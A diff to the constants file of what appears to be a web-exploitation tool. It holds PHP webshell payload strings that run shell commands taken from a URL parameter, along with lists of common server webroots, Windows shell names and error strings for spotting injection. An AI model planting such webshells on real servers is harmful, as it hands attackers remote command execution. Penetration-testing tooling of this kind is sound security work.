@@ -3,7 +3,7 @@ MAX_DISPLAY_RESULTS = 10
 PHP_SHELL_CITATION = '<?php system(' + '$_GET["cmd"]' + '); ?>'
 PHP_SHELL_PING = "<?php system(" + "$_GET['cmd']" + "); ?>"
 
-# TODO: Expand with ASP, ASPX, and JSP webshells as well
+# TODO: Expand with ASP, ASPX, and JSP webshells as well. Webshells in `/usr/share/webshells`
 
 WEBROOTS = {
     "WINDOWS": ["", "C:/xampp/htdocs", "C:/wamp/www", "C:/Inetpub/wwwroot"],
@@ -12,5 +12,5 @@ WEBROOTS = {
 
 WINDOWS_SHELLS = ["powershell.exe", "powershell", "cmd.exe", "cmd"]
 
-INTERESTING_STRINGS = [".aspx", ".jsp", ".php", "SQL Syntax", "Syntax Error", "Incorrect syntax", "Failed", "Error", "Warning"]
+INTERESTING_STRINGS = ["INTERESTING_INCLUDED_PAYLOAD", ".aspx", ".jsp", ".php", "SQL Syntax", "Syntax Error", "Incorrect syntax", "Failed", "Error", "Warning"]
 INTERESTING_STRINGS = [wr for wr in (WEBROOTS["LINUX"] + WEBROOTS["WINDOWS"]) if wr] + INTERESTING_STRINGS
